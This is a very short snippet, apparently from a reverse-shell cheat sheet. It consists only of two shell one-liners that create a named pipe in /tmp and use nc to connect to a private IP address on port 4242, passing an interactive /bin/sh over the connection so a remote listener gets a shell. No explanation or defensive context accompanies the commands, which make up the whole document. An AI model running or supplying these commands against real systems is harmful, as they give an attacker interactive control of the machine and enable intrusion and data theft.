
```sh
mkfifo /tmp/f;nc 10.8.3.12 4242 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f
```

```sh
mknod /tmp/f p;nc 10.10.15.18 4242 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f
```

